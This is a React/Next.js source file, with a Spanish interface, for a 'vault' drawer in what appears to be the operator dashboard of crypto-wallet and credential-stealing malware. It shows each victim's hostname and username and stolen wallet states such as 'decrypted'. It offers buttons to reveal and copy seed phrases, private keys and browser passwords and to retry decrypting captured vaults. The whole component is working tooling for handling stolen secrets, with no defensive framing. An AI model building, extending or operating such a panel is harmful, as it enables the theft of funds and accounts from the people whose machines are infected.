'use client';
import { useEffect, useRef, useState } from 'react';
import Link from 'next/link';
import { AlertTriangle, Copy, Eye, EyeOff, FolderOpen, KeyRound, RefreshCw, X } from 'lucide-react';
import { toast } from 'sonner';
import { api, ApiError } from '@/lib/api';
import { useApi, mutate } from '@/hooks/useApi';
import type { Credential, VaultWallet } from '@/lib/types';
import { ago, copy, dateTime, mask } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { SkeletonRows } from '@/components/ui/table';
import { cn } from '@/lib/cn';

const STATE_TITLE: Record<string, string> = {
  found: 'Cartera localizada; el vault aún no se ha abierto.',
  decrypted: 'Contenido descifrado y secretos extraídos.',
  locked: 'Vault cifrado; falta la contraseña.',
  no_vault: 'La extensión está instalada pero no hay vault.',
  unsupported: 'Formato no soportado por el agente.',
  corrupt: 'El almacén está dañado o ilegible.',
  failed: 'El último intento de descifrado falló.'
};

export function stateTone(state: string): 'ok' | 'warn' | 'bad' | 'default' {
  if (state === 'decrypted') return 'ok';
  if (state === 'locked' || state === 'no_vault') return 'warn';
  if (state === 'corrupt' || state === 'failed') return 'bad';
  return 'default';
}

export function StateChip({ state }: { state: string }) {
  return <Badge tone={stateTone(state)} title={STATE_TITLE[state] ?? state}>{state}</Badge>;
}

export function VaultDrawer({ walletId, onClose }: { walletId: string | null; onClose: () => void }) {
  const wallet = useApi<VaultWallet & { victim: { id: string; hostname: string; username: string }; credentials: Credential[] }>(
    walletId ? `/vault/wallets/${walletId}` : null
  );
  const [revealed, setRevealed] = useState<Record<string, string>>({});
  const [busy, setBusy] = useState('');
  const panel = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (walletId) panel.current?.focus();
  }, [walletId]);

  useEffect(() => {
    setRevealed({});
  }, [walletId]);

  useEffect(() => {
    function onKey(event: KeyboardEvent) {
      if (event.key === 'Escape' && walletId) onClose();
      if (event.key === 'Tab' && walletId && panel.current) {
        const nodes = [...panel.current.querySelectorAll<HTMLElement>('button, a[href], input, select, textarea, [tabindex]:not([tabindex="-1"])')].filter((node) => !node.hasAttribute('disabled'));
        if (nodes.length === 0) return;
        const first = nodes[0]!;
        const last = nodes.at(-1)!;
        if (event.shiftKey && document.activeElement === first) { event.preventDefault(); last.focus(); }
        else if (!event.shiftKey && document.activeElement === last) { event.preventDefault(); first.focus(); }
      }
    }
    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [walletId, onClose]);

  if (!walletId) return null;

  async function reveal(kind: string, credential?: boolean, id?: string): Promise<string | null> {
    setBusy(kind);
    try {
      const path = credential ? `/vault/credentials/${id}/reveal` : `/vault/wallets/${walletId}/reveal?kind=${encodeURIComponent(kind)}`;
      const data = await api<{ value: string }>(path);
      setRevealed((current) => ({ ...current, [credential ? `c:${id}` : kind]: data.value }));
      return data.value;
    } catch (caught) {
      toast.error(caught instanceof ApiError ? caught.message : 'No se pudo revelar');
      return null;
    } finally {
      setBusy('');
    }
  }

  async function copyCredential(credential: Credential) {
    const key = `c:${credential.id}`;
    const value = revealed[key] ?? await reveal('password', true, credential.id);
    if (!value) return;
    copy(value);
    toast.success('Contraseña copiada');
  }

  async function copyKind(kind: string) {
    try {
      let value = revealed[kind];
      if (!value) {
        const data = await api<{ value: string }>(`/vault/wallets/${walletId}/reveal?kind=${encodeURIComponent(kind)}`);
        value = data.value;
        setRevealed((current) => ({ ...current, [kind]: value }));
      }
      copy(value);
      toast.success(`${kind === 'seed' ? 'Seed' : kind === 'private_key' ? 'Clave' : 'Contraseña'} copiada`);
    } catch (caught) {
      toast.error(caught instanceof ApiError ? caught.message : 'No se pudo copiar');
    }
  }

  async function retry() {
    setBusy('retry');
    try {
      await mutate(`/vault/wallets/${walletId}/retry`, 'POST');
      toast.success('Reintento de descifrado encolado');
      wallet.refresh();
    } catch (caught) {
      toast.error(caught instanceof ApiError ? caught.message : 'No se pudo reintentar');
    } finally {
      setBusy('');
    }
  }

  const data = wallet.data;
  const seed = data?.secrets.find((secret) => secret.kind === 'seed' || secret.kind === 'mnemonic');
  const key = data?.secrets.find((secret) => secret.kind === 'private_key' || secret.kind === 'keystore');
  const password = data?.secrets.find((secret) => secret.kind === 'password' || secret.kind === 'passphrase');

  return (
    <div className="fixed inset-0 z-50 flex justify-end" role="dialog" aria-modal="true" aria-label={data ? `Bóveda ${data.targetId}` : 'Bóveda'}>
      <button aria-label="Cerrar bóveda" className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" onClick={onClose} />
      <div ref={panel} tabIndex={-1} className="drawer-panel relative outline-none animate-in slide-in-from-right duration-200">
        <header className="shrink-0 border-b border-line/80 p-4">
          <div className="flex items-start gap-2">
            <div className="min-w-0 flex-1">
              <p className="truncate font-mono text-base font-semibold">{data?.label ?? data?.targetId ?? 'Bóveda'}</p>
              <p className="truncate text-2xs text-muted">{data?.victim.hostname} · {data?.victim.username} · {data ? ago(data.lastSeenAt) : ''}</p>
            </div>
            <Button size="icon" variant="ghost" onClick={onClose} aria-label="Cerrar"><X className="h-4 w-4" /></Button>
          </div>
          {data ? (
            <div className="mt-2 flex flex-wrap items-center gap-1.5">
              <StateChip state={data.state} />
              <Badge>{data.kind}</Badge>
              {data.address ? <button className="chip" onClick={() => { copy(data.address!); toast.success('Dirección copiada'); }} title={data.address}>{mask(data.address, 12)} <Copy className="h-2.5 w-2.5" /></button> : <span className="chip">address —</span>}
              <span className={cn('chip', data.balance && data.balance !== '0' && 'border-warn/40 text-warn')}>balance {data.balance ?? '—'}</span>
              <Link href={`/victims?select=${data.victim.id}&tab=boveda`} className="chip border-brand/40 text-brand">abrir víctima</Link>
            </div>
          ) : null}
          {data?.reason ? <p className="mt-2 text-2xs text-muted">motivo: {data.reason}</p> : null}
          {data?.decryptError ? <p className="mt-2 rounded border border-bad/30 bg-bad/10 p-2 text-2xs text-bad"><AlertTriangle className="mr-1 inline h-3 w-3" />{data.decryptError}</p> : null}
          <div className="mt-3 flex flex-wrap gap-1.5">
            <Button size="sm" variant="secondary" disabled={!seed} onClick={() => copyKind('seed')}><Copy className="h-3 w-3" /> Copiar seed</Button>
            <Button size="sm" variant="secondary" disabled={!key} onClick={() => copyKind('private_key')}><KeyRound className="h-3 w-3" /> Copiar clave</Button>
            <Button size="sm" variant="secondary" disabled={!password} onClick={() => copyKind('password')}><Copy className="h-3 w-3" /> Copiar contraseña</Button>
            <Button size="sm" variant="secondary" loading={busy === 'retry'} onClick={retry}><RefreshCw className="h-3 w-3" /> Reintentar descifrado</Button>
            <Button size="sm" variant="ghost" onClick={() => { copy(data?.path ?? ''); toast.success('Ruta copiada'); }}><FolderOpen className="h-3 w-3" /> Abrir carpeta</Button>
          </div>
        </header>

        <div className="scroll-panel min-h-0 flex-1 space-y-4 p-4">
          {wallet.loading ? <SkeletonRows rows={8} cols={2} /> : wallet.error ? (
            <p className="text-xs text-bad">{wallet.error.message}</p>
          ) : (
            <>
              <section>
                <p className="mb-2 text-2xs uppercase tracking-wide text-muted">Secretos</p>
                {data?.secrets.length === 0 ? (
                  <p className="rounded border border-line p-3 text-xs text-muted">Sin secretos. Pulsa Escanear wallets o Reintentar descifrado.</p>
                ) : data?.secrets.map((secret) => {
                  const value = revealed[secret.kind];
                  const isSeed = secret.kind === 'seed' || secret.kind === 'mnemonic';
                  return (
                    <div key={secret.id} className="mb-2 rounded-lg border border-line bg-panel-2/40 p-3">
                      <div className="flex items-center gap-2">
                        <Badge tone={isSeed ? 'ok' : secret.kind === 'private_key' ? 'brand' : 'warn'}>{secret.kind}</Badge>
                        {secret.words ? <span className="text-2xs text-muted">{secret.words} palabras</span> : null}
                        <span className="ml-auto text-2xs text-muted">{dateTime(secret.updatedAt)}</span>
                      </div>
                      {value ? (
                        isSeed ? (
                          <div className="mt-2 grid grid-cols-3 gap-1 font-mono text-2xs">
                            {value.split(/\s+/).map((word, index) => (
                              <span key={`${word}-${index}`} className="rounded border border-line bg-bg px-1.5 py-1"><span className="mr-1 text-muted/50">{index + 1}</span>{word}</span>
                            ))}
                          </div>
                        ) : <p className="mt-2 break-all font-mono text-xs text-ink">{value}</p>
                      ) : (
                        <p className="mt-2 break-all font-mono text-xs text-muted">{secret.preview}</p>
                      )}
                      <div className="mt-2 flex gap-1">
                        <Button size="sm" variant="ghost" loading={busy === secret.kind} onClick={() => value ? setRevealed((current) => { const next = { ...current }; delete next[secret.kind]; return next; }) : reveal(secret.kind)}>
                          {value ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />} {value ? 'ocultar' : 'ver'}
                        </Button>
                        <Button size="sm" variant="ghost" onClick={() => { copy(value ?? secret.preview); toast.success('Copiado'); }}>copiar</Button>
                      </div>
                    </div>
                  );
                })}
              </section>

              <section>
                <p className="mb-2 text-2xs uppercase tracking-wide text-muted">Credenciales del perfil</p>
                {data?.credentials.length === 0 ? <p className="text-xs text-muted">Sin credenciales ligadas.</p> : data?.credentials.map((credential) => (
                  <div key={credential.id} className="mb-1 flex items-center gap-2 rounded border border-line px-2 py-1.5 text-xs">
                    <div className="min-w-0 flex-1">
                      <p className="truncate font-mono">{credential.url ?? '—'}</p>
                      <p className="truncate text-2xs text-muted">{credential.username || '—'} · {credential.state}</p>
                    </div>
                    <span className="font-mono text-2xs">{revealed[`c:${credential.id}`] ?? credential.passwordPreview ?? '—'}</span>
                    <Button size="sm" variant="ghost" loading={busy === credential.id} onClick={() => reveal('password', true, credential.id)}><Eye className="h-3 w-3" /></Button>
                    <Button size="sm" variant="ghost" onClick={() => void copyCredential(credential)}><Copy className="h-3 w-3" /></Button>
                  </div>
                ))}
              </section>

              <section className="border-t border-line pt-3 text-2xs text-muted">
                <p className="break-all font-mono">{data?.path}</p>
                <p className="mt-1">origen: {data?.source ?? '—'} · visto: {dateTime(data?.lastSeenAt)}</p>
              </section>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
